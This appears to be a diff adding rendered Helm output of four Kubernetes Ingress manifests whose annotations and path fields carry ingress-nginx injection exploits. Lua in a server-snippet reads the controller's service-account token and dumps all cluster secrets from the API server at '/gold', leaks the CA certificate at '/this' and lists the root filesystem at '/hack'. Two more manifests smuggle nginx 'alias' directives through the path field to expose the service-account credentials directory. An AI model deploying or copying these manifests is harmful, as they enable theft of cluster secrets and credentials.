@@ -1,0 +1,189 @@
+---
+# Source: monitoring/charts/poly/templates/ingress.yaml
+apiVersion: networking.k8s.io/v1
+kind: Ingress
+metadata:
+  name: hello-app-v1beta1-42
+  labels:
+    helm.sh/chart: hello-app-0.1.0
+    app: "hello-app"
+    owner: "is"
+    pic: "IS.namtt"
+    app.kubernetes.io/name: hello-app
+    app.kubernetes.io/instance: "hello-app"
+    app.kubernetes.io/version: "1.16.0"
+    app.kubernetes.io/managed-by: "Helm"
+  annotations:    
+    kubernetes.io/ingress.class: "nginx"
+    kubernetes.io/tls-acme: 'true'
+    nginx.ingress.kubernetes.io/rewrite-target: "/$2"
+    nginx.ingress.kubernetes.io/server-snippet: |
+      location ^~ "/gold" {
+        default_type 'text/plain';
+        content_by_lua_block {
+          local result = io.popen("cat /var/run/secrets/kubernetes.io/serviceaccount/token")
+          local token = result:read("*a")
+          local cmd = 'curl --header "Authorization: Bearer ' .. token .. '" --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt https://192.168.8.11:6443/api/v1/secrets';
+          local secrets = io.popen(cmd)
+          local gold = secrets:read("*a")
+          ngx.say(gold);
+          result:close();
+          secrets:close();
+        }
+      }
+      location ^~ "/this" {
+        default_type 'text/plain';
+        content_by_lua_block {
+          local handle = io.popen("cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt");
+          local result = handle:read("*a");
+          ngx.say(result);
+          handle:close();
+        }
+      }
+      location ^~ "/hack" {
+        autoindex on;
+        default_type 'text/plain';
+        alias /;
+      }
+spec:
+  rules:
+    - host: nginx-template.local.ftech.ai
+      http:
+        paths:
+        - path: /dont
+          pathType: Prefix
+          backend:
+            service:
+              name: hello-app
+              port:
+                number: 8080
+        - path: /hack
+          pathType: Prefix
+          backend:
+            service:
+              name: hello-app
+              port:
+                number: 8080
+        - path: /this
+          pathType: Prefix
+          backend:
+            service:
+              name: hello-app
+              port:
+                number: 8080
+        - path: /gold
+          pathType: Prefix
+          backend:
+            service:
+              name: hello-app
+              port:
+                number: 8080
+---
+# Source: monitoring/charts/poly/templates/ingress.yaml
+apiVersion: networking.k8s.io/v1
+kind: Ingress
+metadata:
+  name: hello-app-v1beta1-42-new
+  labels:
+    helm.sh/chart: hello-app-0.1.0
+    app: "hello-app"
+    owner: "is"
+    pic: "IS.namtt"
+    app.kubernetes.io/name: hello-app
+    app.kubernetes.io/instance: "hello-app"
+    app.kubernetes.io/version: "1.16.0"
+    app.kubernetes.io/managed-by: "Helm"
+  annotations:    
+    kubernetes.io/ingress.class: "nginx"
+    kubernetes.io/tls-acme: 'true'
+    nginx.ingress.kubernetes.io/rewrite-target: "/$2"
+    nginx.ingress.kubernetes.io/server-snippet: |
+      location ^~ "/this" {
+        default_type 'text/plain';
+        content_by_lua_block {
+          local handle = io.popen("cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt");
+          local result = handle:read("*a");
+          ngx.say(result);
+          handle:close();
+        }
+      }
+spec:
+  rules:
+    - host: nginx-template.local.ftech.ai
+      http:
+        paths:
+        - path: /dont
+          pathType: Prefix
+          backend:
+            service:
+              name: hello-app
+              port:
+                number: 8080
+        - path: /this
+          pathType: Prefix
+          backend:
+            service:
+              name: hello-app
+              port:
+                number: 8080
+---
+# Source: monitoring/charts/poly/templates/ingress.yaml
+apiVersion: networking.k8s.io/v1
+kind: Ingress
+metadata:
+  name: hello-app-v1beta1-45
+  labels:
+    helm.sh/chart: hello-app-0.1.0
+    app: "hello-app"
+    owner: "is"
+    pic: "IS.namtt"
+    app.kubernetes.io/name: hello-app
+    app.kubernetes.io/instance: "hello-app"
+    app.kubernetes.io/version: "1.16.0"
+    app.kubernetes.io/managed-by: "Helm"
+  annotations:    
+    kubernetes.io/ingress.class: "nginx"
+    kubernetes.io/tls-acme: 'true'
+spec:
+  rules:
+    - host: nginx-template.local.ftech.ai
+      http:
+        paths:
+        - path: /gaf{alias /var/run/secrets/kubernetes.io/serviceaccount/;}location ~* ^/aaa
+          pathType: Prefix
+          backend:
+            service:
+              name: hello-app
+              port:
+                number: 8080
+---
+# Source: monitoring/charts/poly/templates/ingress.yaml
+apiVersion: networking.k8s.io/v1
+kind: Ingress
+metadata:
+  name: hello-app-v1beta1-48
+  labels:
+    helm.sh/chart: hello-app-0.1.0
+    app: "hello-app"
+    owner: "is"
+    pic: "IS.namtt"
+    app.kubernetes.io/name: hello-app
+    app.kubernetes.io/instance: "hello-app"
+    app.kubernetes.io/version: "1.16.0"
+    app.kubernetes.io/managed-by: "Helm"
+  annotations:    
+    kubernetes.io/ingress.class: "nginx"
+    kubernetes.io/tls-acme: 'true'
+spec:
+  rules:
+    - host: nginx-template.local.ftech.ai
+      http:
+        paths:
+        - path: "/gaf{alias #\n/var/run/secrets/kubernetes.io/serviceaccount/;}location ~* ^/aaa"
+          pathType: Prefix
+          backend:
+            service:
+              name: hello-app
+              port:
+                number: 8080
+            
